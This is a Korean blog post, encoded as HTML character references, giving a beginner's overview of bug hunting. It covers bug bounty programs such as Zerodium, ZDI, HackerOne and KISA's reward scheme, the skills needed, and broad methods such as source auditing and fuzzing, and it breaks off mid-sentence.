&#xC6F9; &#xC11C;&#xBE44;&#xC2A4; &#xB4F1;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC81C;&#xBCF4;&#xD574; &#xAE08;&#xC804;&#xC801;&#xC778; &#xBCF4;&#xC0C1;, &#xD574;&#xCEE4;&#xC758; &#xBA85;&#xC608; &#xD68D;&#xB4DD; &#xB4F1; &#xC774;&#xB4DD;&#xC744; &#xB178;&#xB9AC;&#xB294; &#xC77C;&#xB828;&#xC758; &#xD589;&#xC704;&#xC785;&#xB2C8;&#xB2E4;. &#xBB50; &#xADF8;&#xB7EC;&#xB2C8;&#xAE4C; &#xACB0;&#xAD6D; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC2E0;&#xB098;&#xAC8C; &#xCC3E;&#xACE0; &#xB3C8;&#xB3C4; &#xBC1B;&#xACE0; &#xD06C;&#xB798;&#xB527;&#xB3C4; &#xBC1B;&#xACE0; &#x3131;&#x3147;&#x3137;</p><p>&#xAD6D;&#xB0B4;&#xC758; &#xACBD;&#xC6B0; &#xC8FC;&#xC758;&#xD574;&#xC57C; &#xD560; &#xC810;&#xC740; &#xC11C;&#xBE44;&#xC2A4; &#xC911;&#xC778; &#xC6F9; &#xC0AC;&#xC774;&#xD2B8; &#xD639;&#xC740; &#xC11C;&#xBC84;&#xC5D0; &#xB300;&#xD55C; &#xACF5;&#xACA9;&#xC740; &#xBD88;&#xBC95;&#xC774;&#xBBC0;&#xB85C; &#xC6F9; &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC740; &#xC880; &#xD798;&#xB4E4;&#xACA0;&#xB124;&#xC694; &#x3160;&#x3160; &#xD558;&#xC9C0;&#xB9CC; &#xC81C;&#xAC00; &#xC54C;&#xAE30;&#xB85C;&#xB294; &#xB124;&#xC774;&#xBC84;&#xB294; &#xAC00;&#xB2A5;&#xD55C; &#xAC78;&#xB85C; &#xC54C;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xBC84;&#xADF8;-&#xBC14;&#xC6B4;&#xD2F0;"><a href="#&#xBC84;&#xADF8;-&#xBC14;&#xC6B4;&#xD2F0;" class="headerlink" title="&#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;"></a>&#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;</h1><p>&#xD574;&#xCEE4;&#xB4E4;&#xC774; &#xC81C;&#xBCF4;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xC0C1;&#xC744; &#xD574;&#xC8FC;&#xB294; &#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="1-&#xAC01;-&#xD68C;&#xC0AC;&#xBCC4;-&#xBC84;&#xADF8;-&#xBC14;&#xC6B4;&#xD2F0;"><a href="#1-&#xAC01;-&#xD68C;&#xC0AC;&#xBCC4;-&#xBC84;&#xADF8;-&#xBC14;&#xC6B4;&#xD2F0;" class="headerlink" title="1) &#xAC01; &#xD68C;&#xC0AC;&#xBCC4; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;"></a>1) &#xAC01; &#xD68C;&#xC0AC;&#xBCC4; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;</h2><p>&#xC678;&#xAD6D; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xAC01; &#xD68C;&#xC0AC;(&#xB2E4;&#xB294; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC;)&#xB9C8;&#xB2E4; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xC6B4;&#xC601;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB4E4; &#xC798; &#xC544;&#xC2DC;&#xACA0;&#xC9C0;&#xB9CC; &#xB300;&#xD45C;&#xC801;&#xC73C;&#xB85C; &#xAD6C;&#xAE00;, &#xD398;&#xC774;&#xC2A4;&#xBD81;, &#xC560;&#xD50C; &#xB4F1;&#xB4F1; &#xC6EC;&#xB9CC;&#xD55C; &#xC544;&#xB294; &#xAE30;&#xC5C5;&#xB4E4;&#xC740; &#xB2E4; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xC6B4;&#xC601;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xC790;&#xC0AC;&#xC758; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xB300;&#xD574;&#xC11C;&#xB9CC; &#xC6B4;&#xC601;&#xD558;&#xACE0; &#xC788;&#xC8E0;. &#xD558;&#xC9C0;&#xB9CC; &#xAC01;&#xC790; &#xC6B4;&#xC601; &#xB8F0;&#xC740; &#xC870;&#xAE08;&#xC529; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC5B4;&#xB514;&#xB294; &#xC790;&#xC0AC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD06C;&#xB798;&#xC2DC;&#xB9CC; &#xBC1B;&#xB294; &#xACF3;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xC5B4;&#xB514;&#xB294; &#xD480; &#xC775;&#xC2A4;&#xAE4C;&#xC9C0; &#xC788;&#xC5B4;&#xC57C;&#xC9C0;&#xB9CC; &#xBCF4;&#xC0C1;&#xC744; &#xD574;&#xC8FC;&#xB294;&#x2026; &#xC544;&#xB2C8;&#xBA74; &#xD06C;&#xB798;&#xB527;&#xB9CC; &#xC8FC;&#xACE0; &#xB9AC;&#xC6CC;&#xB4DC;&#xB294; &#xC5C6;&#xB294;&#x2026;. &#xBB50; &#xADF8;&#xB7F0; &#xAC70;&#xB294; &#xAC01; &#xD68C;&#xC0AC;&#xC758; &#xD648;&#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xC744; &#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><a href="https://www.bugcrowd.com/bug-bounty-list/">https://www.bugcrowd.com/bug-bounty-list/</a></p><p>&#xC704; &#xB9C1;&#xD06C;&#xB97C; &#xB4E4;&#xC5B4;&#xAC00;&#xC2DC;&#xBA74; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xC6B4;&#xC601;&#xD558;&#xACE0; &#xC788;&#xB294; &#xD68C;&#xC0AC;&#xB4E4;&#xC758; &#xB9AC;&#xC2A4;&#xD2B8;&#xC640; &#xC6B4;&#xC601; &#xBC29;&#xC2DD;&#xC774; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD00;&#xC2EC; &#xC788;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xBA74; &#xB420; &#xAC70; &#xAC19;&#xC544;&#xC694;.</p><h2 id="2-&#xC81C;&#xB85C;&#xB514;&#xC6C0;-ZDI-&#xD574;&#xCEE4;&#xC6D0;-&#xB4F1;"><a href="#2-&#xC81C;&#xB85C;&#xB514;&#xC6C0;-ZDI-&#xD574;&#xCEE4;&#xC6D0;-&#xB4F1;" class="headerlink" title="2) &#xC81C;&#xB85C;&#xB514;&#xC6C0;, ZDI, &#xD574;&#xCEE4;&#xC6D0; &#xB4F1;"></a>2) &#xC81C;&#xB85C;&#xB514;&#xC6C0;, ZDI, &#xD574;&#xCEE4;&#xC6D0; &#xB4F1;</h2><p>&#xD0C0; &#xD68C;&#xC0AC;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xB3C4; &#xC81C;&#xBCF4;&#xBC1B;&#xB294; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xC785;&#xB2C8;&#xB2E4;. &#xBCF4;&#xC0C1;&#xC774; &#xC318; &#xAC78;&#xB85C; &#xC720;&#xBA85;&#xD558;&#xC8E0;. &#xC81C;&#xB85C;&#xB514;&#xC6C0;&#xC758; &#xBCF4;&#xC0C1;&#xAE08;&#xC561;&#xC744; &#xD55C;&#xBC88; &#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2021/03/07/l0ch/bughunting-tutorial/image1.png" alt></p><blockquote><p>&#xCD9C;&#xCC98; : &#xC81C;&#xB85C;&#xB514;&#xC6C0;</p></blockquote><p>&#xADF8;&#xB0E5; &#xBD10;&#xB3C4; &#xC0C1;&#xB2F9;&#xD788; &#xC138;&#xC8E0;?? &#x314E;&#x3137;&#x3137;</p><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; $10,000 &#xBA74; &#xC9C0;&#xAE08; &#xD658;&#xC728;&#xB85C; &#xACC4;&#xC0B0;&#xD574;&#xBCF4;&#xBA74; &#xCC9C;&#xB9CC; &#xC6D0;&#xC774; &#xB118;&#xB124;&#xC694;;;; &#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xB9CC;&#xD07C; &#xC26C;&#xC6B4; &#xD0C0;&#xAE43;&#xC740; &#xD558;&#xB098;&#xB3C4; &#xC5C6;&#xB124;&#xC694; &#x3160;&#x3160; &#xADF8;&#xB9AC;&#xACE0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xB4E4; &#xD480; &#xC775;&#xC2A4;&#xB97C; &#xD574;&#xC11C; &#xBCF4;&#xB0B4;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB354;&#xB354;&#xC6B1; &#xD798;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xCEE4;&#xC6D0; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xB294; &#xC81C;&#xB85C;&#xB514;&#xC6C0;&#xACFC; ZDI &#xC640;&#xB294; &#xB2E4;&#xB974;&#xAC8C; &#xC6F9; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB9CC; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD6D;&#xB0B4;&#xC5D0;&#xC11C; &#xC6F9; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xBABB;&#xD574;&#xC11C; &#xC544;&#xC26C;&#xC6B4; &#xBD84;&#xB4E4;&#xC740; &#xD574;&#xCEE4;&#xC6D0; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xC2DC;&#xB3C4;&#xD574;&#xBCF4;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC744; &#xB4EF;&#xD569;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><h2 id="3-KISA-S-W-&#xC2E0;&#xADDC;-&#xCDE8;&#xC57D;&#xC810;-&#xD3EC;&#xC0C1;-&#xC2E0;&#xACE0;&#xC81C;"><a href="#3-KISA-S-W-&#xC2E0;&#xADDC;-&#xCDE8;&#xC57D;&#xC810;-&#xD3EC;&#xC0C1;-&#xC2E0;&#xACE0;&#xC81C;" class="headerlink" title="3) KISA S/W &#xC2E0;&#xADDC; &#xCDE8;&#xC57D;&#xC810; &#xD3EC;&#xC0C1; &#xC2E0;&#xACE0;&#xC81C;"></a>3) KISA S/W &#xC2E0;&#xADDC; &#xCDE8;&#xC57D;&#xC810; &#xD3EC;&#xC0C1; &#xC2E0;&#xACE0;&#xC81C;</h2><p>&#xC804; &#xC138;&#xACC4;&#xC801;&#xC73C;&#xB85C; &#xC720;&#xC77C;&#xD558;&#xAC8C; &#xAD6D;&#xAC00;&#xAE30;&#xAD00;&#xC774; &#xC6B4;&#xC601;&#xD558;&#xACE0; &#xC788;&#xB294; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC785;&#xB2C8;&#xB2E4;.(&#xB77C;&#xACE0; &#xBC1C;&#xD45C;&#xC5D0;&#xC11C; &#xB4E4;&#xC5C8;&#xB358; &#xAC8C; &#xC0DD;&#xAC01;&#xC774; &#xB098;&#xB124;&#xC694;) &#xADF8;&#xB9AC;&#xACE0; &#xAD6D;&#xB0B4;&#xC5D0;&#xC11C; &#xBA87; &#xC5C6;&#xB294; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0; &#xC911; &#xD558;&#xB098;&#xC774;&#xAE30;&#xB3C4; &#xD558;&#xC8E0; &#x314B;&#x314B;</p><p>&#xD0A4;&#xC0AC;&#xB97C; &#xC81C;&#xC678;&#xD558;&#xACE0; &#xC0BC;&#xC131;&#xC774;&#xB098; &#xB2E4;&#xB978; &#xBA87;&#xBA87; &#xD68C;&#xC0AC;&#xC5D0;&#xC11C;&#xB3C4; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xC6B4;&#xC601;&#xD558;&#xACE0; &#xC788;&#xC9C0;&#xB9CC; &#xB300;&#xC0C1;&#xC774; &#xC81C;&#xD55C;&#xC801;&#xC778; &#xAC78;&#xB85C; &#xAE30;&#xC5B5;&#xD569;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xAC1C;&#xC778;&#xC801;&#xC73C;&#xB85C; &#xD0A4;&#xC0AC;&#xC5D0;&#xC11C; &#xC6B4;&#xC601;&#xD558;&#xB294; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xAC00; &#xC81C;&#xC77C; &#xAD1C;&#xCC2E;&#xC740; &#xAC70; &#xAC19;&#xB124;&#xC694;.(&#xC560;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E; &#xB9CE;&#xC774; &#xC81C;&#xBCF4;&#xD558;&#xC9C0;&#xB294; &#xC54A;&#xC558;&#xC9C0;&#xB9CC;&#x2026;)</p><p><a href="https://www.krcert.or.kr/consult/software/vulnerability.do?orgSiteUrl=https://www.krcert.or.kr">https://www.krcert.or.kr/consult/software/vulnerability.do?orgSiteUrl=https://www.krcert.or.kr</a></p><p>&#xC704; &#xB9C1;&#xD06C;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; &#xC2E0;&#xACE0;&#xC11C; &#xC591;&#xC2DD;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD574; &#xC591;&#xC2DD;&#xB300;&#xB85C; &#xC791;&#xC131;&#xD558;&#xACE0; &#xC81C;&#xBCF4;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC27D;&#xC8E0;?</p><p>2016&#xB144;&#xC5D0;&#xB294; eip&#xB9CC; &#xBC14;&#xAFD4;&#xC11C; &#xC81C;&#xBCF4;&#xB97C; &#xD574;&#xB3C4; &#xD3EC;&#xC0C1;&#xC744; &#xC92C;&#xB358; &#xAC70; &#xAC19;&#xC740;&#xB370; &#xCD5C;&#xADFC;&#xC5D0;&#xB294; &#xAF2D; &#xD480; &#xC775;&#xC2A4;&#xB97C; &#xD574;&#xC57C;&#xC9C0;&#xB9CC; &#xD3EC;&#xC0C1;&#xC744; &#xC900;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694; &#x3160;&#x3160;</p><h1 id="&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xCC3E;&#xAE30;-&#xC804;&#xC5D0;"><a href="#&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xCC3E;&#xAE30;-&#xC804;&#xC5D0;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC804;&#xC5D0;"></a>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC804;&#xC5D0;</h1><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC804;&#xC5D0; &#xBA3C;&#xC800; &#xC54C;&#xC544;&#xB46C;&#xC57C; &#xD560; &#xAC83;&#xB4E4;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xBA3C;&#xC800; &#xC598;&#xAE30;&#xD574;&#xBCFC;&#xAC8C;&#xC694;</p><ol><li>&#xBAA8;&#xB4E0; &#xCDE8;&#xC57D;&#xC810;&#xC740; untrust input&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xBB34;&#xC2A8; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB4E0; &#xAC04;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xACE0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xC758; &#xC870;&#xC791;&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xBAA8;&#xB4E0; &#xBC84;&#xADF8;&#xAC00; &#xC775;&#xC2A4; &#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC774; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xC5B4;&#xB3C4; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xB54C;&#xBB38;&#xC5D0; &#xC775;&#xC2A4;&#xB97C; &#xBABB; &#xD560; &#xC218;&#xB3C4; &#xC788;&#xACE0; &#xC544;&#xB2C8;&#xBA74; eip &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC5C6;&#xC5B4;&#xC11C; &#xC775;&#xC2A4;&#xB97C; &#xBABB;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x2192; &#xC2E4;&#xC81C; &#xACBD;&#xD5D8;&#xC784;. &#xC624;&#xBC84; &#xD50C;&#xB85C;&#xC6B0; &#xD588;&#xB294;&#xB370; &#xC775;&#xC2A4; &#xBABB;&#xD568;&#x2026;(&#xC0AC;&#xC2E4; &#xB354; &#xBCF4;&#xAE30; &#xADC0;&#xCC2E;&#xC544;&#xC11C; &#xC548; &#xBD04;)</li><li>&#xB0A8;&#xC774; &#xC774;&#xBBF8; &#xCC3E;&#xC544;&#xC11C; &#xC81C;&#xBCF4;&#xB97C; &#xD588;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xAC00; &#xB098;&#xC624;&#xBA74; &#xBC14;&#xB85C;&#xBC14;&#xB85C; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC775;&#xC2A4;&#xD558;&#xACE0; &#xC788;&#xB294;&#xB370; &#xB2E4;&#xB978; &#xC0AC;&#xB78C;&#xC774; &#xBA3C;&#xC800; &#xC81C;&#xBCF4;&#xD574;&#xC11C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD55C; &#xAC78; &#xBAA8;&#xB974;&#xACE0; &#xC788;&#xB2E4;&#xAC00; &#xC2DC;&#xAC04;&#xB9CC; &#xB0A0;&#xB9AC;&#xBA74; &#xC5B5;&#xC6B8;&#xD558;&#xC790;&#xB098;&#xC694; &#x3160;&#x3160; (&#xC790;&#xAE30; &#xAEBC;&#xB294; &#xD328;&#xCE58; &#xC548;&#xB420; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD558;&#xC9C0; &#xB9C8;&#xC138;&#xC694;&#x2026; &#xD328;&#xCE58;&#xB2F9;&#xD558;&#xBA74; &#xC0B6;&#xC758; &#xC758;&#xC695;&#xC774; &#xC0AC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;&#x2026; &#x3160;&#x3160;)</li><li>&#xAD6D;&#xB0B4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xB294; &#xC678;&#xAD6D; &#xC720;&#xBA85; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xBCF4;&#xB2E4;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xB9CE;&#xC740; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;.(&#xC544; &#xBB3C;&#xB860; &#xC9C4;&#xC9DC; &#xBCF4;&#xC548;&#xC5D0; &#xC2E0;&#xACBD; &#xC4F4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC81C;&#xC678;&#xD558;&#xACE0;&#xC694;. &#xD55C;&#xAE00; &#xAC19;&#xC774;&#x2026;.? &#x3160;&#x3160; &#xBCF4;&#xC548;&#xBAA8;&#xB4C8; &#xC62C;&#xB77C;&#xAC00;&#xACE0; &#xB098;&#xC11C;&#xB294; &#xC775;&#xC2A4; &#xD558;&#xAE30; &#xD798;&#xB4E4;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;) &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xB54C; &#xAC00;&#xC7A5; &#xBD88;&#xC548;&#xD55C; &#xAC83;&#xC774; &#x201C;&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5C6;&#xC73C;&#xBA74; &#xC5B4;&#xCA4C;&#xC9C0;?&#x201D;&#xC778;&#xB370; &#xBCF4;&#xD1B5; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC774; &#xC61B;&#xB0A0; &#xBAA8;&#xB4C8;&#xC744; &#xC4F0;&#xAC70;&#xB098; &#xCC98;&#xC74C; &#xC124;&#xACC4;&#xD560; &#xB54C; &#xBCF4;&#xC548;&#xC5D0; &#xC2E0;&#xACBD; &#xC4F0;&#xC9C0; &#xC54A;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC774; &#xC788;&#xC5B4;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30;&#xC5D0;&#xB294; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xC544;&#xB9C8;&#xB3C4;&#x2026;?)</li></ol><p>&#xADF8;&#xB7FC; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBB34;&#xC5C7;&#xC774; &#xD544;&#xC694;&#xD560;&#xAE4C;&#xC694;?</p><ol><li>&#xB9AC;&#xBC84;&#xC2F1; : &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5B4;&#xB514; &#xC788;&#xB294;&#xC9C0; &#xADF8;&#xB9AC;&#xACE0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3CC;&#xC544;&#xAC00;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xB9AC;&#xBC84;&#xC2F1;&#xC5D0; &#xC775;&#xC219;&#xD574;&#xC838; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC798;&#xD560;&#xC218;&#xB85D; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB354; &#xBE60;&#xB974;&#xAC8C; &#xCC3E;&#xACA0;&#xC8E0;.</li><li>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; : &#xC774;&#xAC70;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xACE0; eip&#xB97C; &#xC7A1;&#xACE0; &#xB098;&#xC11C;&#xC758; &#xBB38;&#xC81C;&#xC778;&#xB370; &#xC0AC;&#xC2E4; &#xAD6D;&#xB0B4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC775;&#xC2A4; &#xD560; &#xB54C;&#xC5D0;&#xB294; corelan&#xC758; <a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/">windows exploitation tutorial</a>&#xB9CC; &#xC77D;&#xC5B4;&#xB3C4; &#xCDA9;&#xBD84;&#xD569;&#xB2C8;&#xB2E4;.(&#xB300;&#xBD80;&#xBD84;&#xC740;? &#xC800;&#xB3C4; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xD574;&#xBCF8; &#xAC8C; &#xC544;&#xB2C8;&#xB77C; &#xC7A5;&#xB2F4;&#xC740; &#xBABB;&#xD558;&#xACA0;&#xB124;&#xC694;)</li><li>&#xAC1C;&#xBC1C; &#xB2A5;&#xB825; : &#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xAC1C;&#xBC1C; &#xB2A5;&#xB825;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xB9AC;&#xBC84;&#xC2F1;&#xD558;&#xB294; &#xB370;&#xC5D0;&#xB3C4; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xACE0; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xAD6C;&#xC870;&#xB97C; &#xC880; &#xB354; &#xC815;&#xD655;&#xD788; &#xBE68;&#xB9AC; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;. &#xC800;&#xB294; &#xAC1C;&#xBC1C;&#xC744; &#xBABB;&#xD574;&#xC11C; &#xC774;&#xB807;&#xAC8C; &#xD574;&#xD0B9;&#xC744; &#xBABB;&#xD558;&#xB098; &#xBD05;&#xB2C8;&#xB2E4; &#x315C;&#x3160; &#xAC1C;&#xBC1C;&#xC740; &#xB610; &#xC5B8;&#xC81C; &#xACF5;&#xBD80;&#xD558;&#xC9C0;&#x2026;</li></ol><h1 id="&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xCC3E;&#xB294;-&#xBC29;&#xBC95;"><a href="#&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xCC3E;&#xB294;-&#xBC29;&#xBC95;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xBC29;&#xBC95;"></a>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xBC29;&#xBC95;</h1><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC18C;&#xC2A4;&#xCF54;&#xB4DC; &#xC624;&#xB514;&#xD305;</li><li>&#xC190; &#xD37C;&#xC9D5;</li><li>&#xD37C;&#xC9D5;</li></ol><p>&#xC77C;&#xB2E8; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC; &#xC624;&#xB514;&#xD305;&#xC758; &#xACBD;&#xC6B0; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xC5B4;&#xC57C;&#xACA0;&#xC8E0;?? &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD0D0;&#xC0C9;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;. &#xAD6D;&#xB0B4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xB294; &#xAC70;&#xC758; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC774;&#xB124;&#xC694; &#x3160;&#x3160; &#xC74C; &#xD5E5;&#xC2A4;&#xB808;&#xC774; &#xBCF4;&#xBA74;&#xC11C; &#xD558;&#xB294; &#xAC83;&#xB3C4; &#xD574;&#xB2F9; &#xC0AC;&#xD56D;&#xC774; &#xB418;&#xB824;&#xB098;&#xC694;? &#xBB50; &#xADF8;&#xB0E5; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xACE0; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC83;&#xC744; &#xB450;&#xB8E8;&#xB450;&#xB8E8; &#xB9D0;&#xD558;&#xB294; &#xAC70;&#xB77C;&#xACE0; &#xBCF4;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;.</p><p>&#xC190;&#xD37C;&#xC9D5; &#xAC19;&#xC740; &#xACBD;&#xC6B0; &#xC81C;&#xAC00; &#xCC98;&#xC74C; &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD588;&#xB358; 